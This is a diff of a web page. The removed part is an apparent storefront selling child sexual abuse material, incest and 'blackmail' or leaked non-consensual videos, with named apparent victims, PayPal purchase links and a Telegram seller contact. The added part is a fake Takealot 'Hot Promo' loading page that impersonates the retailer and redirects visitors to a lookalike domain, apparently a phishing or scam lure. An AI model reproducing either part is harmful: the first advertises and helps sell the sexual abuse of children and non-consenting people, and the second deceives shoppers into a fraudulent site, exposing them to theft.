@@ -1,508 +1,262 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bestsellers Interface</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.css">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <title>Takealot | Processing Hot Promo...</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --tk-blue: #0B79BF;
+            --tk-dark: #121212;
+            --tk-grey: #4C4C4E;
+            --glass: rgba(0, 0, 0, 0.03);
+            --premium-gradient: linear-gradient(135deg, #0b79bf 0%, #064d7a 100%);
+        }
 
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: var(--tk-dark);
+            position: relative;
+        }
+
+        /* Animated Background */
+        .bg-glow {
+            position: absolute;
+            width: 150%;
+            height: 150%;
+            background: radial-gradient(circle at 50% 50%, rgba(11, 121, 191, 0.05) 0%, transparent 50%);
+            animation: pulseBg 8s infinite alternate ease-in-out;
+            z-index: 0;
+        }
+
+        @keyframes pulseBg {
+            0% {
+                transform: scale(1) translate(-10%, -10%);
+                opacity: 0.3;
+            }
+
+            100% {
+                transform: scale(1.2) translate(5%, 5%);
+                opacity: 0.6;
+            }
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            padding: 2.5rem 2rem;
+            max-width: 420px;
+            width: 90%;
+            backdrop-filter: blur(10px);
+            background: #ffffff;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            border-radius: 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
+        }
+
+        .logo-wrapper {
+            margin-bottom: 2rem;
+            position: relative;
+        }
+
+        .logo-container {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 24px;
+            display: inline-block;
+            box-shadow: 0 10px 40px rgba(11, 121, 191, 0.15);
+            animation: logoFloat 3s infinite ease-in-out;
+            border: 1px solid rgba(0, 0, 0, 0.03);
+        }
+
+        .logo-container img {
+            width: 160px;
+            display: block;
+        }
+
+        @keyframes logoFloat {
+
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+            }
+
+            50% {
+                transform: translateY(-8px) scale(1.01);
+            }
+        }
+
+        .promo-badge {
+            display: inline-block;
+            background: #ff3b30;
+            color: white;
+            font-size: 0.75rem;
+            font-weight: 800;
+            padding: 5px 14px;
+            border-radius: 100px;
+            margin-bottom: 1.2rem;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            animation: bounceIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 4px 12px rgba(255, 59, 48, 0.3);
+        }
+
+        @keyframes bounceIn {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+
+            80% {
+                transform: scale(1.1);
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        h1 {
+            font-weight: 800;
+            font-size: 1.6rem;
+            margin-bottom: 0.6rem;
+            color: var(--tk-dark);
+            letter-spacing: -0.5px;
+        }
+
+        p {
+            font-size: 0.95rem;
+            color: #666;
+            margin-bottom: 2.5rem;
+            font-weight: 400;
+            line-height: 1.5;
+        }
+
+        /* Loading Bar */
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 1.2rem;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: var(--tk-blue);
+            box-shadow: 0 0 15px rgba(11, 121, 191, 0.3);
+            border-radius: 10px;
+            transition: width 0.1s linear;
+        }
+
+        .status-text {
+            font-size: 0.75rem;
+            color: var(--tk-blue);
+            text-transform: uppercase;
+            font-weight: 700;
+            letter-spacing: 2px;
+            height: 20px;
+        }
+
+        /* Micro-animations */
+        .dots {
+            display: inline-block;
+            width: 15px;
+            text-align: left;
+        }
+    </style>
 </head>
+
 <body>
 
-    <div class="main-content">
-        <div class="video-carousel">
-            <div class="carousel">
-                <div class="carousel-title">
-                    <h1>Início</h1>
-                </div>
-                <!-- Conteúdo do carrossel -->
-            </div>
-            <div class="swiper">
-                <div class="swiper-wrapper">
-                    <!-- Example of a single video slide -->
-                    <div class="swiper-slide">
-                        <video class="video-player" src="../SubPacks/Previas-ivank/Vid/vid1.mp4" autoplay muted loop></video>
-                        <div class="video-info">
-                            <p><b>☠︎</b>INCEST  TEENS</p>
-                            <p><b>☠︎</b>+405 VIDEOS</p>
-                            <p><b>☠︎</b>11GB</p>
-                            <p><b>☠</b>MEGA LINK</p>
-                            <p style="color: #007AFF;"><b>Ivanka and bro</b></p>
-
-                        </div>
-                        <div class="video-controls">
-                            <button class="btnPlayPause">Pause</button>
-                            <button class="btnMuteUnmute">Unmute</button>
-                        </div>
-                    </div>
-                    <div class="swiper-slide">
-                        <video class="video-player" src="../SubPacks/Previas-incest/Vid/2.mp4" autoplay muted loop></video>
-                        <div class="video-info">
-                            <p><b>☠︎</b>INCEST</p>
-                            <p><b>☠︎</b>5755 VIDEOS</p>
-                            <p><b>☠︎</b>256GB</p>
-                            <p><b>☠︎</b>MEGA LINK</p>
-                            <p style="color: #007AFF;"><b>INCEST</b></p>
-                        </div>
-                        <div class="video-controls">
-                            <button class="btnPlayPause">Pause</button>
-                            <button class="btnMuteUnmute">Unmute</button>
-                        </div>
-                    </div>
-                    <div class="swiper-slide">
-                        <video class="video-player" src="../SubPacks/Previas-lizzy/Vid/primeiro.mp4" autoplay muted loop></video>
-                        <div class="video-info">
-                            <p><b>☠︎</b>INCEST</p>
-                            <p><b>☠︎</b>BLACKMAIL VIDEOS</p>
-                            <p><b>☠︎</b>21GB</p>
-                            <p><b>☠︎</b>MEGA LINK</p>
-                            <p style="color: #007AFF;"><b>Lizzy and bro</b></p>
-                            
-                        </div>
-                        <div class="video-controls">
-                            <button class="btnPlayPause">Pause</button>
-                            <button class="btnMuteUnmute">Unmute</button>
-                        </div>
-                    </div>
-                    <div class="swiper-slide">
-                        <video class="video-player" src="../SubPacks/Previas-anita/Vid/pri.mp4" autoplay muted loop></video>
-                        <div class="video-info">
-                            <p><b>☠︎</b>TEENS</p>
-                            <p><b>☠︎</b>BLACKMAIL VIDEOS</p>
-                            <p><b>☠︎</b>21GB</p>
-                            <p><b>☠︎</b>MEGA LINK</p>
-                            <p style="color: #007AFF;"><b>Anita</b></p>
-                        </div>
-                        <div class="video-controls">
-                            <button class="btnPlayPause">Pause</button>
-                            <button class="btnMuteUnmute">Unmute</button>
-                        </div>
-                    </div>
-                    <div class="swiper-slide">
-                        <video class="video-player" src="../SubPacks/Previas-ash/Vid/principal.mp4" autoplay muted loop></video>
-                        <div class="video-info">
-                            <p><b>☠︎</b>TEENS</p>
-                            <p><b>☠︎</b>BLACKMAIL VIDEOS</p>
-                            <p><b>☠︎</b>16GB</p>
-                            <p><b>☠︎</b>MEGA LINK</p>
-                            <p style="color: #007AFF;"><b>Ash</b></p>
-                        </div>
-                        <div class="video-controls">
-                            <button class="btnPlayPause">Pause</button>
-                            <button class="btnMuteUnmute">Unmute</button>
-                        </div>
-                    </div>
-                    <div class="swiper-slide">
-                        <video class="video-player" src="../SubPacks/Previas-omegle/Vid/vid1.mp4" autoplay muted loop></video>
-                        <div class="video-info">
-                            <p><b>☠︎</b>Omegle</p>
-                            <p><b>☠︎</b>BLACKMAIL VIDEOS</p>
-                            <p><b>☠︎</b>169GB</p>
-                            <p><b>☠︎</b>MEGA LINK</p>
-                            <p style="color: #007AFF;"><b>OMEGLE</b></p>
-                        </div>
-                        <div class="video-controls">
-                            <button class="btnPlayPause">Pause</button>
-                            <button class="btnMuteUnmute">Unmute</button>
-                        </div>
-                    </div>
-                    <div class="swiper-slide">
-                        <video class="video-player" src="../SubPacks/Previas-baby/Vid/Principal.MP4" autoplay muted loop></video>
-                        <div class="video-info">
-                            <p><b>☠︎</b>TEENS</p>
-                            <p><b>☠︎</b>+567 VIDEOS</p>
-                            <p><b>☠︎</b>18GB</p>
-                            <p><b>☠︎</b>MEGA LINK</p>
-                            <p style="color: #007AFF;"><b>Baby-Ashlee</b></p>
-                        </div>
-                        <div class="video-controls">
-                            <button class="btnPlayPause">Pause</button>
-                            <button class="btnMuteUnmute">Unmute</button>
-                        </div>
-                    </div>
-                    <div class="swiper-slide">
-                        <video class="video-player" src="../SubPacks/Previas-cp3/Vid/principal.mp4" autoplay muted loop></video>
-                        <div class="video-info">
-                            <p><b>☠︎</b>CP</p>
-                            <p><b>☠︎</b>+4662</p>
-                            <p><b>☠︎</b>60GB</p>
-                            <p><b>☠︎</b>MEGA LINK</p>
-                            <p style="color: #007AFF;"><b>CP</b></p>
-                        </div>
-                        <div class="video-controls">
-                            <button class="btnPlayPause">Pause</button>
-                            <button class="btnMuteUnmute">Unmute</button>
-                        </div>
-                    </div>
-                    <div class="swiper-slide">
-                        <video class="video-player" src="../SubPacks/Previas-dad/Vid/p.mp4" autoplay muted loop></video>
-                        <div class="video-info">
-                            <p><b>☠︎</b>INCEST</p>
-                            <p><b>☠︎</b>+556 VIDEOS</p>
-                            <p><b>☠︎</b>76GB</p>
-                            <p><b>☠︎</b>MEGA LINK</p>
-                            <p style="color: #007AFF;"><b>Father-and-Daughter</b></p>
-                        </div>
-                        <div class="video-controls">
-                            <button class="btnPlayPause">Pause</button>
-                            <button class="btnMuteUnmute">Unmute</button>
-                        </div>
-                    </div>
-                    <!-- Add more video slides as needed -->
-                    
-                      
-
-
-                </div>
-                <div class="swiper-button-next"></div>
-                <div class="swiper-button-prev"></div>
-            </div>
-           <!-- Indicadores dinâmicos com roleta -->
-           <div class="carousel-indicators">
-            <!-- Adicione mais indicadores se necessário -->
-            <span class="indicator"></span>
-            <span class="indicator"></span>
-            <span class="indicator"></span>
-            <span class="indicator"></span>
-            <span class="indicator"></span>
-            <span class="indicator"></span>
-            <span class="indicator"></span>
-            <span class="indicator"></span>
-            <span class="indicator"></span>
-            <span class="indicator"></span>
-          </div>
-</div>
-        </div>
-    </div>
-    
-
-    <div class="top-bar" id="topBar">
-    </div>
+    <div class="bg-glow"></div>
 
     <div class="container">
-        <h1>Top Teens: Best sellers+</h1>
-        <div class="cards">
-            <!-- Card 1 -->
-            <div class="card" onclick="openPopup('../SubPacks/Previas-lizzy/index.html');">
-                <img src="https://i.postimg.cc/rwX8c6px/Lizzy-and-brother.jpg" alt="lizzy">
-                <div class="card-content">
-                    <h2>1</h2>
-                    <span>Lizzy and Bro</span>
-                </div>
-            </div>
-            <!-- Card 2 -->
-            <div class="card" onclick="openPopup('../SubPacks/Previas-ivank/index.html')">
-                <img src="https://i.postimg.cc/66bPCdJQ/Ivanka-1.jpg" alt="Ivanka-1">
-                <div class="card-content">
-                    <h2>2</h2>
-                     <span>Ivanka and bro </span>
-                </div>
-            </div>
-            <!-- Card 3 -->
-            <div class="card" onclick="openPopup('../SubPacks/Previas-anita/index.html')">
-                <img src="https://i.postimg.cc/qRhJ4p2c/Anita.jpg" alt="Anita">
-                <div class="card-content">
-                    <h2>3</h2>
-                    <span>Anita</span>
-                </div>
-            </div>
-            <!-- Card 4 -->
-            <div class="card" onclick="openPopup('../SubPacks/Previas-abbi/index.html')">
-              <img src="https://i.postimg.cc/7hrk40HD/Abbi.jpg" alt="Abbi">
-              <div class="card-content">
-                  <h2>4</h2>
-                  <span>Abbi</span>
-              </div>
-          </div>
-          <!-- Card 5 -->
-          <div class="card" onclick="openPopup('../SubPacks/Previas-ash/index.html')">
-            <img src="https://i.postimg.cc/mDMvmkQn/Ash.jpg" alt="Ash">
-            <div class="card-content">
-                <h2>5</h2>
-                <span>Ash</span>
+        <div class="logo-wrapper">
+            <div class="logo-container">
+                <img src="logo-takealot.svg" alt="Takealot">
             </div>
         </div>
-           <!-- Card 6 -->
-            <div class="card" onclick="openPopup('../SubPacks/Previas-savannah/index.html')">
-                <img src="https://i.postimg.cc/133Zy9Qg/Savannah.jpg" alt="Savannah">
-                <div class="card-content">
-                    <h2>6</h2>
-                     <span>Savannah</span>
-                </div>
-            </div>
-             <!-- Card 7 -->
-    <div class="card" onclick="openPopup('../SubPacks/Previas-ava/index.html')">
-        <img src="https://i.postimg.cc/wBRZBMbB/Ava.jpg" alt="Ava">
-        <div class="card-content">
-            <h2>7</h2>
-             <span>Ava</span>
+
+        <div class="promo-badge">HOT PROMO</div>
+
+        <h1>Processing Offer</h1>
+        <p>Verifying exclusive POINTEKX RHINO X21 – Pro Tool Combo 100X...</p>
+
+        <div class="progress-container">
+            <div class="progress-bar" id="progress"></div>
         </div>
-    </div>
-<!-- Card 8 -->
-<div class="card" onclick="openPopup('../SubPacks/Previas-baby/index.html')">
-    <img src="https://i.postimg.cc/sgqHbyDC/Baby-Ashlee.jpg" alt="Baby-Ashlee">
-    <div class="card-content">
-        <h2>8</h2>
-         <span>Baby-Ashlee</span>
-    </div>
-</div>
-<!-- Card 9 -->
-<div class="card" onclick="openPopup('../SubPacks/Previas-dark/index.html')">
-    <img src="https://i.postimg.cc/cJTgr1KV/Darkzadie.jpg" alt="Darkzadie">
-    <div class="card-content">
-        <h2>9</h2>
-         <span>Darkzadie</span>
-    </div>
-</div>
 
-<!-- Card 10 -->
-<div class="card" onclick="openPopup('../SubPacks/Previas-izzy/index.html')">
-    <img src="https://i.postimg.cc/hGJvP8B7/Izzy.jpg" alt="Izzy">
-    <div class="card-content">
-        <h2>10</h2>
-         <span>Izzy</span>
+        <div class="status-text" id="status">STARTING...</div>
     </div>
-</div>
-
-<!-- Card 11 -->
-<div class="card" onclick="openPopup('../SubPacks/Previas-garcia/index.html')">
-    <img src="https://i.postimg.cc/xCwtFP0G/Decire-Garcia.jpg" alt="Decire-Garcia">
-    <div class="card-content">
-        <h2>11</h2>
-         <span>Decire-Garcia</span>
-    </div>
-</div>
-
-<!-- Card 12 -->
-<div class="card" onclick="openPopup('../SubPacks/Previas-jess/index.html')">
-    <img src="https://i.postimg.cc/y6Rf32PL/Jess.jpg" alt="Jess">
-    <div class="card-content">
-        <h2>12</h2>
-         <span>Jess</span>
-    </div>
-</div>
-
-<!-- Card 13 -->
-<div class="card" onclick="openPopup('../SubPacks/Previas-marry/index.html')">
-    <img src="https://i.postimg.cc/sDyJQx12/Mary-H.jpg" alt="Mary-H">
-    <div class="card-content">
-        <h2>13</h2>
-         <span>Mary-H</span>
-    </div>
-</div>
-
-<!-- Card 14 -->
-<div class="card" onclick="openPopup('../SubPacks/Previas-b/index.html')">
-    <img src="https://i.postimg.cc/5t95PR8W/Trinity-b.jpg" alt="Trinity-B">
-    <div class="card-content">
-        <h2>14</h2>
-         <span>Trinity-B</span>
-    </div>
-</div>
-
-<!-- Card 15 -->
-<div class="card" onclick="openPopup('https://www.paypal.com/ncp/payment/FWHHBXJ96ND3W')">
-    <img src="https://i.postimg.cc/Vk05zB10/IMAGE-2025-01-21-12-20-56.jpg" alt="ALL TEENS">
-    <div class="card-content">
-        <h2>15</h2>
-         <span>All teens folders</span>
-    </div>
-</div>
-   
-</div>
-</div>
 
     <script>
-        function openPopup(url) {
-            window.open(url, '_blank');
+        const statusEl = document.getElementById('status');
+        const progressEl = document.getElementById('progress');
+
+        const statuses = [
+            "Connecting to server...",
+            "Locating liquidation batch...",
+            "Validating promo code...",
+            "Reserving your unit...",
+            "Redirecting..."
+        ];
+
+        let currentStatus = 0;
+        let progress = 0;
+        const duration = 5000; // 5 seconds confirmed
+        const startTime = Date.now();
+
+        function update() {
+            const elapsed = Date.now() - startTime;
+            progress = Math.min((elapsed / duration) * 100, 100);
+            progressEl.style.width = progress + '%';
+
+            // Change status text based on progress
+            const statusIndex = Math.min(
+                Math.floor((progress / 100) * statuses.length),
+                statuses.length - 1
+            );
+
+            if (statusIndex !== currentStatus) {
+                currentStatus = statusIndex;
+                statusEl.innerText = statuses[currentStatus].toUpperCase();
+            }
+
+            if (progress < 100) {
+                requestAnimationFrame(update);
+            } else {
+                setTimeout(() => {
+                    window.location.href = 'https://tools.takealot-shop.online/';
+                }, 500);
+            }
         }
+
+        // Wait slightly before starting
+        setTimeout(() => {
+            update();
+        }, 500);
     </script>
-
-<div class="container">
-    <h1>Cp Collections: Best sellers+</h1>
-    <div class="cards">
-        <!-- Card 1 -->
-        <div class="card" onclick="openPopup('../SubPacks/Previas-cp1/index.html')">
-            <img src="https://i.postimg.cc/wT89h8dM/CP1.jpg" alt="cp1">
-            <div class="card-content">
-                <h2>1</h2>
-                <span>Cp-1</span>
-            </div>
-        </div>
-        <!-- Card 2 -->
-        <div class="card" onclick="openPopup('../SubPacks/Previas-cp2/index.html')">
-            <img src="https://i.postimg.cc/W4tBBXPx/CP2.jpg" alt="cp2">
-            <div class="card-content">
-                <h2>2</h2>
-                <span>Cp-2</span>
-            </div>
-        </div>
-        <!-- Card 3 -->
-        <div class="card" onclick="openPopup('../SubPacks/Previas-cp3/index.html')">
-          <img src="https://i.postimg.cc/Y0BTm7mw/CP3.jpg" alt="cp3">
-          <div class="card-content">
-              <h2>3</h2>
-              <span>Cp-3</span>
-          </div>
-      </div>
-      <!-- Card 4 -->
-      <div class="card" onclick="openPopup('../SubPacks/Previas-pc4/index.html')">
-        <img src="https://i.postimg.cc/ZKZ1bTS8/CP4.jpg" alt="cp4">
-        <div class="card-content">
-            <h2>4</h2>
-            <span>Cp-4</span>
-        </div>
-    </div>
-        <!-- Card 5 -->
-        <div class="card" onclick="openPopup('https://www.paypal.com/ncp/payment/GRTCPVGTWGCTL')">
-            <img src="https://i.postimg.cc/tCXM023D/IMAGE-2025-01-21-12-35-16.jpg" alt="all cp">
-            <div class="card-content">
-                <h2>5</h2>
-                <span>All cp folders</span>
-            </div>
-        </div>
-    </div>
-</div>
-
-
-<div class="container">
-    <h1>Leaked Videos: Best Sellers+</h1>
-    <div class="cards">
-        <!-- Card 1 -->
-        <div class="card" onclick="openPopup('../SubPacks/Previas-omegle/index.html')">
-            <img src="https://i.postimg.cc/wxP7ZGYY/OMEGLE.jpg" alt="OMEGLE">
-            <div class="card-content">
-                <h2>1</h2>
-                <span>Omegle Top Tier </span>
-            </div>
-        </div>
-        <!-- Card 2 -->
-        <div class="card" onclick="openPopup('../SubPacks/Previas-incest/index.html')">
-            <img src="https://i.postimg.cc/K8bLpHtv/Real-Incest.jpg" alt="INCEST">
-            <div class="card-content">
-                <h2>2</h2>
-                <span>Real-Incest</span>
-            </div>
-        </div>
-        <!-- Card 3 -->
-        <div class="card" onclick="openPopup('../SubPacks/Previas-mom/index.html')">
-          <img src="https://i.postimg.cc/wMK3y1VT/MOM-AND-SON.jpg" alt="mom">
-          <div class="card-content">
-              <h2>3</h2>
-              <span>Mom and Son</span>
-          </div>
-      </div>
-      <!-- Card 4 -->
-      <div class="card" onclick="openPopup('../SubPacks/Previas-dad/index.html')">
-        <img src="https://i.postimg.cc/L8451Kzf/Father-and-Daughter.jpg" alt="Father-and-Daughter">
-        <div class="card-content">
-            <h2>4</h2>
-            <span>Father and Daughter</span>
-        </div>
-    </div>
-        <!-- Card 5 -->
-        <div class="card" onclick="openPopup('../SubPacks/Previas-black/index.html')">
-            <img src="https://i.postimg.cc/J4YVP9fj/Black-Mail.jpg" alt="Black-Mail">
-            <div class="card-content">
-                <h2>5</h2>
-                <span>Black-Mail</span>
-            </div>
-        </div>
-        <!-- Card 6 -->
-        <div class="card" onclick="openPopup('../SubPacks/Previas-monkey/index.html')">
-            <img src="https://i.postimg.cc/brwDjZq6/Monkey-App.jpg" alt="Monkey-App">
-            <div class="card-content">
-                <h2>6</h2>
-                <span>Monkey-App Wins</span>
-            </div>
-        </div>
-        <!-- Card 7 -->
-        <div class="card" onclick="openPopup('../SubPacks/Previas-Uflash/index.html')">
-            <img src="https://i.postimg.cc/52KD1Tbb/Uflash.jpg" alt="Uflash">
-            <div class="card-content">
-                <h2>7</h2>
-                <span>Uflash</span>
-            </div>
-        </div>
-    </div>
-</div>
-
-<div class="carousel-wrapper">
-    <h1>For you</h1>
-    <div class="slider">
-      <div class="slide-card" onclick="window.location.href='https://www.seusite1.com';">
-        <img src="https://i.postimg.cc/HLbkLC58/VIP-CHANNEL.jpg" alt="Lizzy and Brother">
-        <div class="card-info">
-          <h3>Vip Channel acess</h3>
-          <p>Get all content in one.</p>
-        </div>
-      </div>
-      <div class="slide-card" onclick="openPopup('https://www.paypal.com/ncp/payment/NP7XFAZZEYVGC')">
-        <img src="https://i.postimg.cc/Vk05zB10/IMAGE-2025-01-21-12-20-56.jpg" alt="Anita">
-        <div class="card-info">
-          <h3>Teens  Collections</h3>
-          <p>Get best teens Leaked video in on.</p>
-        </div>
-      </div>
-      <div class="slide-card" onclick="openPopup('https://www.paypal.com/ncp/payment/GRTCPVGTWGCTL')">
-        <img src="https://i.postimg.cc/tCXM023D/IMAGE-2025-01-21-12-35-16.jpg " alt="Abbi">
-        <div class="card-info">
-          <h3>Cp  Collections</h3>
-          <p>Get best cp video in one.</p>
-        </div>
-      </div>
-    </div>
-    <div class="nav-buttons">
-      <button class="nav-btn" id="prev-button">&#9664;</button>
-      <button class="nav-btn" id="next-button">&#9654;</button>
-    </div>
-  </div>
-
-<div class="hub">
-  <!-- Loader -->
-  <div class="background-fade">
-    <div class="logo-container">
-      <div class="logo">Netflixhub</div>
-      <div class="spinner"></div>
-    </div>
-  </div>
-
-  <!-- Footer -->
-  <div class="footer">
-    <h3>Stay Connected</h3>
-
-    <!-- Social Media Icons -->
-    <div class="social-icons">
-      <a href="https://twitter.com" target="_blank" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
-      <a href="https://facebook.com" target="_blank" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
-      <a href="https://instagram.com" target="_blank" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
-      <a href="https://linkedin.com" target="_blank" aria-label="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
-    </div>
-
-    <!-- Telegram Support Button -->
-    <a href="https://t.me/leakssupplier" target="_blank" class="support-btn">
-      <i class="fab fa-telegram-plane"></i>Support on Telegram
-    </a>
-  </div>
-
-  <script>
-    window.addEventListener("load", () => {
-      // Espera o carregamento da página e depois remove o loader
-      const loader = document.querySelector(".background-fade");
-      const logoContainer = document.querySelector(".logo-container");
-
-      // Remove o loader após 5 segundos
-      setTimeout(() => {
-        loader.style.display = "none";
-        logoContainer.style.display = "none";
-      }, 5000);
-    });
-  </script>
-
-    <script src="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.js"></script>
-
-<script src="script.js"></script>
 </body>
+
 </html>
